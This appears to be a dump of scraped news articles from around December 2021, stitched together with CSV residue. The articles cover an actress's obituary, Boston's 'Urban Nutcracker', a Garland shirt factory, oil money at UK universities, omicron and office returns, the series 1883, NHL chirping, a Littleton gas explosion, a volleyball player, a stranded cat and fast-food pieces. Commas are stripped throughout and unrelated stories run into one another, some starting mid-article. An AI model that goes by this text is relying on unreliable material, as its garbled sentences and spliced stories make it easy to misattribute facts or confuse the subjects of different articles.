Williams later appeared on three first-season episodes of CBS’ Rhoda as a work associate of David Groh’s character but rarely appeared on the screen after that.

Born Bernice Kamiat on June 29 1925 she was driven into show business by her mother who brought her out to California when she was a teenager. At age 13 Williams did voices for Porky Pig cartoons.

She signed a contract with 20th Century Fox and had a small part as a secretary in Otto Preminger’s Laura (1944) then had bit parts in two movies adored by film noir aficionados The Spider (1945) and Elia Kazan’s Boomerang! (1947).

After playing opposite Humphrey Bogart in Nicholas Ray’s Knock on Any Door (1949) Williams spent the next several years working in TV on such shows as Suspense and The Philco-Goodyear Television Playhouse. She later appeared on four episodes of Alfred Hitchcock Presents.

Williams’ body of work also included a pair of movies starring Dan Dailey — The Girl Next Door (1953) and Meet Me in Las Vegas (1956) — The Great Diamond Robbery (1954) Michael Curtiz’s The Helen Morgan Story (1957) and Doctors’ Wives (1971).

She is also survived by her son John Blyth Barrymore who played David Carradine’s nephew Zeke on the 1970s ABC series Kung Fu.

A Jamaica Plain native who spent the first half of his life dancing with major companies including the Boston Ballet Joffrey Ballet and Canada’s Royal Winnipeg Ballet Williams pictured a version of Tchaikovsky’s “Nutcracker” that reflected the art and people of his city.

“I remember being in a rehearsal for the very first time and getting a glimmer of this really working” Williams said of starting work on “Urban Nutcracker” two decades ago. “It’s like you’re in a mine and you’re trying to get gold and you have to chip away. You see a little glitter of gold in the rock so you say ‘Oh I’m going to keep at this.’”

“You get flakes of gold” he said with a laugh. “But you get a lot of flakes that are just rocks.”

Williams says he’s been collecting those flakes over 20 years. A nugget of ballet or tap or hip hop a bit of classical or jazz and he kept refining them until he had a whole Santa sack full of gold.

After a year off because of the pandemic “Urban Nutcracker” returns to the Boch Center Shubert Theatre from Dec. 18 to Dec. 22 to present a uniquely Boston event that sets a thrilling mix of traditional and contemporary dance movements to iconic music.

“We have Tchaikovsky we have Duke Ellington we have classical ballet hip hip flamenco swing dance tap so we have a diversity in the cast” he said. “But I am really proud of the diversity in the audience. It’s really quite nice because I remember going to see ‘The Nutcracker’ in Boston in the ’60s and ’70s and there was hardly any diversity whatsoever.”

To put on this year’s 20th anniversary production of “Urban Nutcracker” Williams had to forge a series of new partnerships. He says COVID-19 drastically reduced the number of dancers willing to audition. So Williams the founder of JP’s Tony Williams Dance Center connected with a range of performing arts organizations: Brooklyn Ballet Unyted Stylz the Northeast Youth Ballet and Cambridge’s Revels.

“We have seven dancers who go back and forth in a week between here and Brooklyn” Williams said.

He could have abandoned the effort early on but pushing forward he’s seen the production make great strides. Cast members 12 and up are all fully vaccinated and a small number of younger dancers will be masked for the short time they are on stage. Despite hurdles the orchestra has actually doubled in size for this edition to a 16-piece band.

The efforts are enormous but the goal is important.

“When I first thought of combining the old with new I had no idea that this experiment I had in my brain would work on stage but on opening night the audience was incredible and we sold out the Strand Theater in Dorchester with no advertising” Williams said. “This was right after 9/11 and some of my friends asked at the time if I should be putting this on. But I felt we needed a sense of community in the city.”

“This year it’s sort of the same thing” he continued. “People really need to get back into the theater and enjoy and not just the audience but myself the company the parents of the kids they are excited for this.”

Former Garland Mayor Winifred Murphy pointed out new Mayor Austin Brown during a visit to the factory.

Kenneth Ragland is the owner of Garland Apparel Group and he and the company have ushered in a renovation of the Garland Shirt Factory.

The factory floor is full of machinery and more will be coming in shortly.

GARLAND — Just a few weeks ago in Garland the first crew came into the building with aims to clean up everything. A fantastic facelift was done and from there folks were coming in droves to apply for positions at the Garland Shirt Factory.

Now Garland is set to see even more of a boon in the form of a new expansion and additional hiring with owner Kenneth Ragland explaining that even more equipment is coming too as part of the Garland Apparel Group’s new focus.

Currently they are working on shirts picking up projects from different companies and fulfilling orders as they come in this way they don’t have to keep a load of inventory representatives said.

They may end up doing some work for Brooks Brothers but it won’t be like they were doing before.

“So the shirting side is moving along” he said. “It is doing extremely well and we are getting orders every day.”

Ragland and his team are taking on new business all the time and working out contracts for a variety of different projects. Right now they are working on creating a contract with a men’s brand from the 1980s that is looking to bring back some of their production back stateside.

“But most importantly they want to tie into us with sustainable and organic cotton that is raised in the United States” he said. “They want a from end to end made in the U.S. of U.S. components.”

He described the situation as a “huge opportunity” with 100000 units a year or more. Additionally they are looking at working with some companies that Garland has worked with in the past and Ragland said Polo Ralph Lauren was one brand they are looking towards.

“We are trying to finalize a program for shirting with them” he said.

Right now the hopes are that they will be potentially be able to add onto the building especially since they are moving their tailor production or suit making to the Garland location.

“So this factory is literally going to have two lines” he said.

This is going to involve hiring 50 to 60 union employees he said and another 10 to 12 professionals. He is moving six people down to Garland for this.

In addition to all of this they are working on developing a brand for the company something specific that will come out of the Garland Shirt Factory.

“That brand will be ‘Garland Works’” he said.

Right now they are in the last stages of finalizing the design and Garland Works will be an online business something that Ragland said that he is very excited about.

There will be soft shouldered jackets trousers shirting and more.

This won’t be the only bit of ground that Garland will be breaking — they will be the only factory in the United States that can do both tailored units and shirting he explained.

“They typically very incompatible to one another” Ragland said.

That’s going to require training assistance and being a part of the community.

“The goal here is to invest” he said. “Between the roof the air conditioning and other repairs probably spent around $500000. I suspect that there’s going to be another million dollars that is going to be spent in the next six to nine months.”

Ragland said that he is supposed to be retiring shortly but that he is planning to finish up and be in that position in the middle of next year. He has been in this industry for 43 years and it was something that he fell into out of graduate school.

The people he is bringing down to help with the setup include folks that are going to see a bit of a culture shock he said explaining that this is indicative of having a diverse work force. One person is who is coming down is from India a husband and wife from Albania and one person is from Rochester N.Y..

“That’s what this industry has been built on for generations” he said stating that folks that had come into their Chicago factory were often Italian or Irish.

Ragland said that these folks come in to do work that a lot of folks don’t want to do or their children don’t want to do explaining that we have become spoiled.

“These are people who come here with a purpose. They want to take care of their families and raise their kids raise their lifestyle and we need to be mindful of that.”

One of the most burning questions folks in the area have is whether or not the outlet will return.

Ragland said that there is not going to be a commitment to that as having the outlet wasn’t practical before. It was essentially a money pit according to him where Brooks Brothers was selling items they were losing money on while losing money selling them.

Oxford Cambridge and Imperial College London have been criticised for taking the most with one MP branding the relationship between oil giants and universities “scandalous”.

Imperial College London has accepted more than £54m including £39m from Shell – with which it boasts of having a “long-standing and fruitful partnership”.

The college has refused to explain exactly what the money was used for simply saying that it funded research into “energy transition lowering carbon emissions in extraction and in carbon mitigation measures”.

Cambridge University also received more than £14m from oil giants while Oxford University got almost £8m. These include large donations to Oxford’s Said Business School Centre for Corporate Reputation.

In total 36 universities said they have received funding from eight oil giants with others refusing to disclose whether they had received similar funding.

The findings come as universities face growing pressure to reduce carbon emissions and break ties with fossil fuel corporations.

Companies of all sizes are rethinking their plans to send workers back to the office as the new omicron variant adds another layer of uncertainty.Alphabet's Google and the nation's second largest automaker Ford Motor Co. are among those once again delaying their return-to-office plans while other businesses whose employees have already returned are considering adding extra precautions like requiring masks. Officials in the United Kingdom Denmark Norway and Sweden also have asked people in recent days to work from home if they can because of concerns about the variant. Meta  formerly known as Facebook and ridesharing company Lyft separately announced Tuesday that they're letting workers delay their return when offices fully reopen early next year. Meta still plans to open its headquarters at the end of January but will allow workers to delay their return as late as June. Lyft says it won't require workers to come back to its offices for all of next year though they will fully reopen as planned in February. Janelle Gale  vice president of human resources for Meta said the latest decision recognizes ""some aren't quite ready to come back.""The moves are the latest indication of how difficult it is for companies to set firm plans for their employees' mandatory return as worries about a spike in new cases or new variants keep shifting deadlines. This fall the delta variant spurred many big companies to postpone a mandatory return to early next year.""A year and a half ago we thought this would be for a very short time"" said Jeff Levin-Scherz population health leader at Willis Towers Watson a global advisory firm. ""But the pandemic has thrown us many curves and employers need to continue to be nimble.""The firm's survey of 543 employers with 5.2 million workers showed on average 34% of remote-capable employees remain remote but that would decline to 27% by the first quarter of 2022. However the survey was conducted before news of omicron surfaced.The delayed plans are yet another blow to already struggling restaurants bars dry cleaners and other businesses that rely on office workers as patrons. Particularly hard-hit are those in downtown or midtown areas of cities like New York dominated by office buildings that remain largely empty.The delays come even as U.S. health officials say early indications suggest omicron may be less dangerous than delta which continues to fuel hospitalizations. Lawrence Gostin  a public health expert at Georgetown University doesn't believe there's enough scientific information on omicron to warrant companies delaying their return-to-office plans.""There will be a constant stream of new variants as well as surges and waning of cases"" Gostin said. ""We shouldn't disrupt normal business activity at every possible trigger.""He noted that layered protection like masks vaccinations and ventilation are highly effective at preventing virus spread in a workplace.Still the stream of new variants is having a psychological impact on business owners.""Omicron has made me realize work life will never return to the way it was pre-COVID"" said Gisela Girard  president of advertising agency Creative Civilization whose 12 employees have been working remotely since March 2020. ""It made me realize how working from home is likely to keep employees their families and also our clients safe.""This summer Girard's company aimed for a mandatory hybrid work plan to start in fall but delta pushed back those plans to early next year. Now omicron has her reconsidering not only those plans but whether employees should return at all. She renewed the office lease last year but said she's rethinking the physical office space.For companies that have already brought workers back to the office it's harder to retreat and allow them to be remote again. Still some are considering new safety measures. Kent Swig  president of Swig Equities LLC a privately owned real estate investment and development company in Manhattan said its 65 employees returned to the office in fall 2020 on a hybrid basis and went to five days a week in the office in May after all were vaccinated.However Swig says he's now closely monitoring the new variant and will consider mandating masks and even requiring COVID-19 testing a few times a week if the threat increases. He said he will reverse course and start hybrid or remote work if the situation gets worse.""My first and foremost job is to protect all my staff"" Swig said. ""I am going to err on the side of caution.""Levin-Scherz noted many employers have set multiple dates for return to the workplace over the past year and at this point are looking to resolve more uncertainty before they set new dates.Target CEO Brian Cornell recently told The Associated Press that it's ""avoiding putting dates on the calendar"" for a mandated return to its Minneapolis headquarters. Target started gradually opening collaboration areas and workspaces in the fall for employees who wanted an option to work on-site.""We're going to learn along the way and make sure we make the right steps for our team"" Cornell said.Lyft said the decision to let workers choose to work remotely for all of 2022 wasn't tied exclusively to omicron but said new variants are a factor contributing to uncertainty.""We've heard from our team members that they value continued flexibility in determining where they work and would benefit from additional time to plan"" said Ashley Adams a Lyft spokeswoman.Meanwhile Google is indefinitely delaying the mandatory return to its offices. A company spokesperson said in an email that the update was in line with its earlier guidance that a return would start no sooner than Jan. 10 and depend on local conditions. The company said it safely opened more than 90% of its U.S. offices and nearly 40% of U.S. workers came into the office in recent weeks.Ford said Monday that it will delay plans for hybrid work at its Dearborn Michigan headquarters until March and plans to start a pilot phase for select employees in February. It had previously said it wouldn't start the hybrid work model before January.Ford said that the hybrid work model affects approximately 18000 employees in North America. Hourly manufacturing employees returned to work in May 2020.",,,,,,,,,,,,

Tim McGraw Faith Hill Sam Elliott and Billy Bob Thornton are the nominal stars of 1883 producer Taylor Sheridan’s eagerly awaited prequel to his smash hit series Yellowstone. But when the first two episodes are screened during gala festivities Saturday evening at the Wynn Las Vegas resort hotel another luminary will briefly assert himself as the center of attention: Tom Hanks.

The two-time Oscar-winner speaks scarcely a word of a dialogue in the Episode 2 prologue a dramatically potent flashback to the aftermath of an infamous Civil War battle. But Hanks eloquently conveys both heartfelt compassion and war-weary resignation as a Union officer — evidently inspired by a real-life figure Gen. George Meade — who offers empathy to James Dutton (McGraw) a Confederate officer who appears more than dead than alive after surviving the historic Battle of Antietam.

Dutton staggers to his feet like someone rising from the grave through sheer force of will and staggers across a battlefield littered with the corpses of soldiers like a shell-shocked ghost. (It’s a powerful image that may nudge some film buffs to recall the opening minutes of Yves Angelo’s 1994 classic Colonel Chabert.) When he can stand no more he sits down to continue surveying the carnage. Hanks’ three-star general rides by dismounts lays a comforting hand on his shoulder then sits beside him. Few words are necessary or even possible for the two warriors. “I know” the general says to the dumbstruck Dutton as they consider the result of the day’s bloody business. “I know.”

And then a narrator — Elsa (Isabel May) Dutton’s daughter — provides the kicker as she informs us: Her father spent three years in a Union prisoner of war camp after Antietam. For the rest of his life he never spoke of his Civil War experiences.

Set to premiere Dec. 19 on the Paramount+ streaming channel 1883 focuses on ancestors of the Yellowstone/Dutton Ranch paterfamilias John Dutton (Kevin Costner) as they journey westward toward the promised land of Montana.

NHL players must have talent grit and ... thick skin,"LOS ANGELES — Jets defenseman Logan Stanley tumbled to the ice his 6-foot-7 frame crumpling after he pasted the Wild's Kirill Kaprizov into the boards.

Despite being 9 inches shorter and weighing 20-plus pounds less Kaprizov barely flinched and he even shoved Stanley while Stanley was still sprawled.

But Stanley wasn't just clashing with Kaprizov during that Oct. 19 game at Xcel Energy Center. He was also taking heat from Marcus Foligno who piped up from the Wild bench.

""Big tree fall hard"" Foligno bellowed drawing on a saying he remembered hearing when he was younger and there was an intimidating 12-year-old on the other team.

""I just had to let Stanley know that even the big trees fall down once in a while"" said Foligno who is known as ""Moose"" to his teammates. ""Little things like that can really tick guys off.""

In between the rattling of the boards and the clatter from sticks another melody croons on the ice.

Players supply a playlist of digs insults and taunts a diss track that they refer to as chirping.

""It's just always been there and I think it always will"" Joel Eriksson Ek said.

This commentary can be factual or hyperbole laced with profanity or right to the point. Not everyone responds and some players are off limits. And in front of the opposing bench that's the lion's den.

But these slights aren't intended to only ruffle the recipient. They can also help the sender.

""It gets you emotionally involved in the game"" Foligno said. ""It brings you into the battle.""

Taxing banter

The subject matter for these quips can range but a common theme is ripping someone's skill.

Questioning why a player is in the NHL is a typical take and a slower skater might hear ""Get the piano off your back.""

Telling someone he doesn't deserve an award is another tactic.

That was inspiration for Foligno against Winnipeg earlier this season with him shouting to the Jets' Mark Scheifele that Eriksson Ek is ""a better Selke"" — referring to the annual trophy given to the best defensive forward in the NHL.

""That can get under guys' skin"" Foligno said ""especially guys that take pride in being a defensive forward in that Selke position. That was more having Ekker's back and obviously Scheifele didn't win it so I think just a little salt to the wound.""

Newcomers to the NHL are also susceptible.

""I've seen where guys go up to a rookie and say 'You need to have over 100 games to talk to me'"" Foligno said.

Even paychecks can be criticized.

""If you've got a guy who's just in the league trying to fight someone who's good I hear a lot 'You're in a different tax bracket' type of thing"" Jordan Greenway said.

Honesty humor and honor

What makes a quality chirp is some truth and a quick delivery.

""There's some guys who are just wittier than others"" Matt Dumba said. ""[They] come up with stuff on the spot.""

If players on the other team think it's funny too that deserves kudos.

""Anytime you can get their teammates to laugh at that point they just gotta give you credit for the joke"" Ryan Hartman said.

The zingers that linger long after the delivery are also well-executed.

""The best chirps are subtle ones that maybe you second-guess your own game"" goalie Cam Talbot said. ""It's in the back of your mind like ... 'Really?' Maybe the more subtle the better. Maybe it gets the other guy thinking more than he should.""

The trash talk happens around the net after whistles before faceoffs and especially while skating by the bench.

""Get off. You're terrible out here"" is one sound-off.

Icings and poor passes are also pointed out rivalry games can get particularly loud and the playoffs are gabfests.

Feedback however isn't equally distributed.

Superstars are a no-go; the only way to send them a message is to keep them off the scoresheet.

""It's tough to obviously chirp guys that have won Stanley Cups because they just pull that out on you"" Foligno said. ""That's the ultimate comeback is 'How many Stanley Cups do you have?' And if you have none you have no comeback.""

Staying quiet

Not everyone counters.

Talbot doesn't participate in the chatter.

""I try to stay away from that"" he said. ""That's a mental game that those guys like to play. I just like to keep to myself and go about my business.""

Eriksson Ek also is quiet.

""I've just never been a guy that talks on the ice to other teams"" he said. ""I'm just trying to stay in my lane and just play the game.""

His non-reaction though still seems to ignite the ire of the opposition since scrums tend to fan around him.

""It's because I play with Moose maybe"" Eriksson Ek said.

Foligno however does recall Eriksson Ek having a spat with the Kings' Adrian Kempe.

""They're yelling at each other but it's in [Swedish]"" Foligno said. ""I'm trying to help out Ekker and I'm like 'I don't know what's going on here. You guys can deal with it.'""

All about the advantage

Even if a player doesn't speak up he still might get heckled. And if someone doesn't have thick skin he will only become a bigger target.

""Whether you dish it or not no matter who you are you're going to get it"" Greenway said. ""But you can't take it to heart. I think the best guys don't even think about it.""

This back-and-forth can actually help a player get more engaged in the game keeping him alert knowing he could be on the receiving end after making his voice heard.

And that's why this conversation happens.

Players are competitive and they are searching for an edge that can help their team.

""Some guys don't like to be chirped at especially the skilled guys"" Foligno said. ""The grinders they're just built that way that they've been doing it for such a long time; they know how to handle it. But some skill guys don't like it.

""You're on them. You're all over them all game. You're yelling at them. It can really tick them off and maybe get them thinking about something else rather than their next play. I think that just puts an advantage on the team that's doing it.""",https://news.google.com/articles/CBMiWmh0dHBzOi8vd3d3LmRlbnZlcjcuY29tL25ld3MvbG9jYWwtbmV3cy9tdWx0aXBsZS1pbmp1cmllcy1yZXBvcnRlZC1pbi1saXR0bGV0b24taG91c2UtZmlyZdIBAA?hl=en-US&gl=US&ceid=US%3Aen,8 injured in Littleton house fire explosion after gas leak,"LITTLETON Colo. — Officials classified a house fire and explosion in Littleton as a “mass casualty incident” after crews responding to the call found multiple people injured on scene.

The call came in sometime around 10:30 a.m. Sunday. Crews from South Metro Fire Rescue responded to a report of an explosion and fire at a home at 5939 South Broadway in Littleton.

Arriving firefighters reported smoke showing from the structure and eight patients were being treated at the scene South Metro Fire officials tweeted.

""When our firefighters arrived on scene they did find a lot of smoke volume coming out of the home"" said Connor Christian the public information officer for South Metro Fire Rescue.

After receiving first-aid on scene six victims were transported to area hospitals where their conditions were described as ""stable."" Two other people were evaluated and refused transport Christian said.

South Metro Fire said the fire was located in the home's basement and crews were ventilating the structure. Christian said the explosion was reported before the fire started in the basement.

""I did speak to a person that was in the home and he felt the home actually move when he reported hearing this explosion and then the fire following"" said Christian.

The home is being used as a vacation rental and the owners were not at the address at the time of the incident.

The cause of the explosion and fire is under investigation. However guests staying at the home said they smelled gas before the explosion occurred.

""People that were here when this initially came through reported an explosion. They also said they were smelling gas before that happened"" said Christian.

South Metro Fire Rescue later said that they were unable to confirm the exact ignition source but they have confirmed there was a gas leak in the home prior to the explosion and fire.

Xcel Energy released the following statement:

""Our thoughts are with the people affected by this incident. We are working with fire officials and emergency responders on the scene and our emergency responders have completed safety checks of the area to confirm it is safe. We will coordinate with fire officials on the investigation into the cause of the incident. Protecting the safety of the public and our employees is a core value and we take it very seriously.""

The extent of the damage to the home is not known at this time.

""You really can't see a lot of the damage of the home from the outside. But a lot of that damage is in the basement on the inside of the home"" said Christian.

There on the court was Greenway when the Rails felt like it should have been them instead. But sports just like life don’t always go the way you want them.

After getting crushed 25-15 in the first set Greenway bounced back for a 28-26 25-23 26-24 victory over Proctor as the Raiders captured the Section 7AA title Nov. 6 in Hermantown thwarting the Rails' attempt at qualifying for their first state volleyball tournament.

“It sucked” Rodberg said bluntly. “It took me a while to get over it honestly probably one or two weeks. After the first set we thought we had it but then we just kind of started playing more carefully as a team. They kind of got up and we went down but we still fought for it. We lost each set by two points so I’m not disappointed at all by that by the effort. We worked hard.”

It was hard work that got Rodberg and Co. to that point one of the best seasons in school history and for that she is Proctor’s first 2021 Duluth News Tribune All-Area Volleyball Player of the Year.

“That’s amazing actually” Rodberg said upon hearing the news. “That’s super cool but at the same time I worked my butt off for it. This is something I wanted as a goal and I achieved that goal.”

That’s something Rodberg’s coaches and teammates say is her “MO” her modus operandi where if she wants something bad enough she’s going to keep working until she gets it.

Rodberg a 5-foot-10 outside hitter with a vertical leap in the high 20s and booming swing has committed to playing college volleyball at Seton Hill an NCAA Division II program in Greensburg Pennsylvania.

Rodberg was a force this fall for the Rails (22-6) with 398 kills good for 4.5 per set while adding 265 digs 58 ace serves 33 set assists and 26 blocks.

“Every coach loves to have a ‘Payton’ on their team someone who is self motivated and driven to succeed” said Rails coach Trish Jauhola. “She’s that person who can take control of a game when we need her to and put that ball down.

“Payton will succeed in athletics wherever she goes. She just has that drive. She is always looking to improve and just has that mentality that she’s not going to fail. She’s always looking to succeed.”

Rodberg is a three-sport athlete. She is a post player in basketball and shortstop in softball.

“You see it in all her sports” Jauhola said. “Failure is not an option in her mind. She’ll succeed in whatever she chooses to do. When she sets her mind to it she’s going to go after it and she’s going to go after it 100%.”

Joining Rodberg on the All-Area First Team is the Rails’ only other senior and her close friend setter Gabby Jauhola Trish’s daughter.

Gabby Jauhola a three-time All-Area selection spearheaded the Rails attack with 829 set assists good for 9.3 per set.

Rodberg and Jauhola are also teammates in basketball.

“I’m definitely going to miss her next year” Gabby Jauhola said. “It’s just going to be different not playing volleyball with her. It was quite the experience. I’ve known her for so long and we know each other so well. I always knew whenever we needed to get that point or kill I’d just look to Payton and she’d put it down. She is just a great player and person who has worked hard for everything she’s accomplished.”

Yes the Rails are only graduating two players but they’re big ones.

Just how big?

Rodberg is a five-year starter and four-time LSC and All-Area selection.

While older records are sketchy or simply nonexistent Trish Jauhola said Rodberg’s 1326 career kills are a program record. Recent standout Sam Pogatchnik for instance finished just shy of 1000 according to Jauhola.

For setting Jauhola said Heather Modean was an amazing setter in the early 1990s who went on to play at St. Cloud State but no record was kept of her set assists. Gabby Jauhola now has the Rails’ standard with 2508 for her career.

“We haven’t had a pair of all-stars like we had this year” Trish Jauhola said. “I mentioned at our banquet ‘Do you realize we had probably the two best volleyball players who ever walked the halls here at Proctor High School?’ It was a fun year. I wish we could keep them longer.”

Rodberg who turned 18 Sunday would love to stay for one more year to have another shot at that elusive state tournament but she has to move on. She certainly will remember the memorable years she had even if her last match was a tough one.

“It hurt me to watch the games at the state tournament but it was something I had to do” Rodberg said. “I just wanted to see the teams and see if we could have been compatible with them and we could have been had we got there. Our hard work didn’t pay off in that game (against Greenway in the section finale) but I wish it did.”

But it sure paid off several times along the way.

(AP) — For at least two days and maybe more residents of a suburban Denver neighborhood worried about the fate of a black cat called Panther who was perched atop a 36-foot (11-meter) utility pole.

Panther stayed put despite efforts by his co-owner Alexis Soberanis and others to coax him down in Aurora. Neither pleading nor the enticement of food did the trick Sentinel Colorado reports.

The cat went missing earlier this week and was first spotted atop the pole on Wednesday.

“Everybody’s been just like ‘Put food down and it’ll come down eventually’” said Aurora resident Jessica Meadows on Friday morning when the city received its first snow of the season. “That’s not going to happen.”

Meadows said she and other neighbors called Aurora animal control and Xcel Energy for help.

“Everyone says they can’t do anything” Meadows said.

Standard practice according to another utility is to give cats time to make their way back down on their own Sentinel Colorado reported.

News of Panther's plight reached Aurora Councilmember Curtis Gardner and city officials dispatched a ladder truck Friday afternoo. After getting the truck into place firefighters rescued the cat. Panther seemed eager to step into a pet carrier.

Kimberly Medina another Panther co-owner said he had always been allowed outside.

No more she said: “Never.”"

Craving some Mexican-inspired food you decide to make a quick stop at Taco Bell. Because your stomach is growling — and everything on the menu just looks so good (so much cheese! so many carbs!) — you order a lot. We're talking a beefy burrito a couple of Doritos Locos Tacos chips queso and of course cinnamon twists for dessert. Halfway through your meal you realized you may have ordered a little bit too much to eat in one sitting. Rather than toss your extra food in the trash and waste all that money you decide to wrap up what you haven't yet eaten to save for later.

Taco Bell leftovers are a great thing to find in your fridge when you're hungry. While some people on Reddit compare cold tacos to cold pizza — as in they think they taste better straight out of the refrigerator — if you're someone who prefers them piping hot you can easily reheat your food. However an image that was recently shared gives the impression that at least one Redditor could be reheating their Taco Bell leftovers still in the packaging and people are concerned. Here's why that might not be such a good idea.",https://news.google.com/articles/CBMiSmh0dHBzOi8vY2EubW92aWVzLnlhaG9vLmNvbS90cmllZC1jaGlja2VuLXNhbmR3aWNoLWtmYy1zYXlzLTEzMjUwMDE3Ny5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,I tried the chicken sandwich KFC says it's seeing huge success with and saw why it's such a hit,"KFC's chicken sandwich has been selling well and propelling the chain through a successful year.

I tried the spicy and regular versions and was impressed.

For the price and lack of wait time KFC beats Chick-fil-A.

KFC's chicken sandwich has been a major success for the chain this year earning rave reviews.

Mary Meisenzahl/Insider

I decided I needed to try it so I headed to my local KFC.

Mary Meisenzahl/Insider

I ordered through KFC's app which directed me to go inside rather than through the drive-thru.

Mary Meisenzahl/Insider

KFC has a pick-up window for mobile orders right at the corner next to where you place orders.

Mary Meisenzahl/Insider

Inside the restaurant was decorated in signs promoting the spicy chicken sandwich which I was there to try.

Mary Meisenzahl/Insider

My food was ready and packed up when I walked in.

Mary Meisenzahl/Insider

I brought the sandwiches back to the car to dig in.

Mary Meisenzahl/Insider

First up the regular non-spicy version.

Mary Meisenzahl/Insider

Like its counterparts at Popeyes the sandwich comes in foil that keeps it warm.

Mary Meisenzahl/Insider

It comes on a bun with pickles and a creamy ranch-like sauce.

Mary Meisenzahl/Insider

From the first bite it was crispy juicy and delicious.

Mary Meisenzahl/Insider

My fiance Joe was also a fan.

Mary Meisenzahl/Insider

Then we moved on to the second spicier version.

Mary Meisenzahl/Insider

It's the same sandwich base as the first covered with a mild hot sauce.

Mary Meisenzahl/Insider

The only thing I didn't love about the sandwiches was the messiness of the sauce.

Mary Meisenzahl/Insider

Though very tasty the orange hot sauce got everywhere.

Mary Meisenzahl/Insider

Both sandwiches felt very substantial each consisting of a large breaded chicken breast.

Mary Meisenzahl/Insider

I thought the size of the sandwiches was an especially good deal for the price which was $3.99 in Rochester New York for both versions.

KFC

For comparison a chicken sandwich from Chick-fil-A costs $4.65 or $4.99 for a spicy chicken sandwich.

Irene Jiang / Business Insider

I'm not the only one who was impressed by KFC's chicken sandwiches. ""It's doing four times better than any chicken sandwich we've ever had in the US before"" Yum Brands CFO Chris Turner told analysts in a recent earnings call.

Same-store sales are up more than 13% over 2019 levels nearly the same level of growth as Popeyes has seen over the same period.

I was also impressed by how quickly I got my food. Given the lower price point and shorter wait time compared to Chick-fil-A I'd probably choose KFC next time I'm craving a spicy chicken sandwich.
